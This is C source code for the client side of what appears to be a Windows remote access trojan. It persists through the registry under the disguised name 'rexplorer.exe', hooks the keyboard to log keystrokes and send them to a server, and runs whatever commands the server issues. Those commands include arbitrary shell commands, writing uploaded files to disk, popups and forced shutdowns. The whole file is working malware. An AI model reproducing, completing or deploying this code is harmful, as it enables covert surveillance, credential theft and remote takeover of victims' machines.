#include "commands.h"
#include "log.h"
#include "net_util.h"

#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#include <winuser.h>

#define PROGRAM_NAME "\\rexplorer.exe"

SOCKET server;
HHOOK hook;
int keylog_on = 1;

static SOCKET init_client(void) {
  AddrInfo *result, *ptr, hints;
  result = ptr = NULL;
  setaddrinfo(&hints);
  if (getaddrinfo(LOCAL_HOST, DEFAULT_PORT, &hints, &result) != 0) {
    LOG_DEBUG("getaddrinfo failed with error: %d", WSAGetLastError());
    return INVALID_SOCKET;
  }
  SOCKET server = INVALID_SOCKET;
  if (ptr == result) {
    LOG_DEBUG("equal");
  } else
    ptr = result;
  server = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
  if (server == INVALID_SOCKET) {
    LOG_DEBUG("socket creating failed with error %d", WSAGetLastError());
    freeaddrinfo(result);
    return INVALID_SOCKET;
  }
  if (connect(server, result->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
    closesocket(server);
    server = INVALID_SOCKET;
  }
  freeaddrinfo(result);
  return server;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  static uint64_t chars_in_cur_line = 0;
  static char
      key_buf[DEFAULT_KEYLOG_BUFLEN *
              2]; // allocate more than necessary to avoid race condition
  static ratpacket_t *p = (ratpacket_t *)key_buf;
  p->op = RAT_PACKET_KEYLOG;
  p->data_len = RAT_KEYLOG_DATA_SIZE;
  LOG_DEBUG("chars %d", chars_in_cur_line);
  if (server == INVALID_SOCKET || !keylog_on) {
    PostQuitMessage(0);
  }
  if (nCode >= 0 && wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
    if (chars_in_cur_line < RAT_KEYLOG_DATA_SIZE)
      p->data[chars_in_cur_line++] = kbd->vkCode;
    if (chars_in_cur_line >= RAT_KEYLOG_DATA_SIZE) {
      LOG_DEBUG("%d", send(server, key_buf, DEFAULT_KEYLOG_BUFLEN, 0));
      chars_in_cur_line = 0;
    }
  }
  return CallNextHookEx(hook, nCode, wParam, lParam);
}

void *keylog_handler(void *vargp) {
  LOG_DEBUG("enter");
  hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
  MSG msg;
  while (GetMessageA(&msg, NULL, 0, 0) > 0) {
    TranslateMessage(&msg);
    DispatchMessageA(&msg);
  }
  UnhookWindowsHookEx(hook);
  LOG_DEBUG("leave");
  return NULL;
}

int main() {
  install_to_registry(PROGRAM_NAME);
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    LOG_ERR("init error: %d\n", WSAGetLastError());
    return 1;
  }
  server = init_client();
  if (server == INVALID_SOCKET) {
    LOG_DEBUG("error: unable to connect to the server");
    WSACleanup();
    return 1;
  }
  uint8_t *data;
  char buf[DEFAULT_BUFLEN];
  ratpacket_t *p = (ratpacket_t *)buf;
  pthread_t keylog_thread;
  pthread_create(&keylog_thread, NULL, keylog_handler, NULL);
  while (1) {
    int sentbytes = recv(server, buf, sizeof(ratpacket_t), 0);
    if (sentbytes == 0) {
      LOG_DEBUG("closing connection...");
      goto exit;
    }
    if (sentbytes < 0) {
      LOG_DEBUG("recv failed with %d", WSAGetLastError());
      closesocket(server);
      goto exit;
    }
    switch (p->op) {
    case RAT_PACKET_TURN_OFF:
      keylog_on = 0;
      break;
    case RAT_PACKET_TURN_ON:
      if (!keylog_on) {
        keylog_on = 1;
        pthread_create(&keylog_thread, NULL, keylog_handler, NULL);
      }
      break;
    case RAT_PACKET_ECHO:
      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
      LOG_DEBUG("arrived echo packet with message: %s", p->data);
      if (send(server, (char *)p, sizeof(*p) + p->data_len, 0) ==
          SOCKET_ERROR) {
        LOG_DEBUG("send failed with %d", WSAGetLastError());
        closesocket(server);
        goto exit;
      }
      LOG_DEBUG("echo completed\n");
      break;
    case RAT_PACKET_RESTART:
      system(RESTART_STR);
      break;
    case RAT_PACKET_SHUTDOWN:
      system(SHUTDOWN_STR);
      break;
    case RAT_PACKET_CMD:
      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
      LOG_DEBUG("arrived cmd packet with message: %s", p->data);
      system((char *)p->data);
      LOG_DEBUG("cmd packet completed");
      break;
    case RAT_PACKET_DISCONNECT:
      goto exit;
    case RAT_PACKET_ALERT:
      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
      alert_t *alert = (alert_t *)p->data;
      LOG_DEBUG("received alert title=\"%s\" text\"%s\" amount=\"%d\"",
                alert->title, alert->text, alert->amount);
      for (; alert->amount > 0; alert->amount--)
        popup(alert->title, alert->text);
      break;
    case RAT_PACKET_FILE:
      LOG_DEBUG("received file rat packet size=%d", p->data_len);
      data = malloc(p->data_len);
      sentbytes = recv(server, (char *)data, p->data_len, 0);
      int name_len = strlen((char *)data);
      entry_t file_entry = {.name = (char *)data,
                            .content_len = p->data_len - name_len - 1,
                            .content = data + name_len + 1};
      LOG_DEBUG("received file entry name=%s size=%d", file_entry.name,
                file_entry.content_len);
      FILE *f;
      fopen_s(&f, file_entry.name, "wb");
      int write_result =
          fwrite(file_entry.content, 1, file_entry.content_len, f);
      LOG_DEBUG("wrote %d bytes out of %d bytes", write_result,
                file_entry.content_len);
      fclose(f);
      free(data);
      break;
    default:
      LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
                p->op);
      break;
    }
  }
exit:
  if (shutdown(server, SD_SEND) == SOCKET_ERROR) {
    LOG_DEBUG("shutdown failed, error: %d", WSAGetLastError());
  }
  closesocket(server);
  server = INVALID_SOCKET;
  pthread_join(keylog_thread, NULL);
  WSACleanup();
  return 0;
}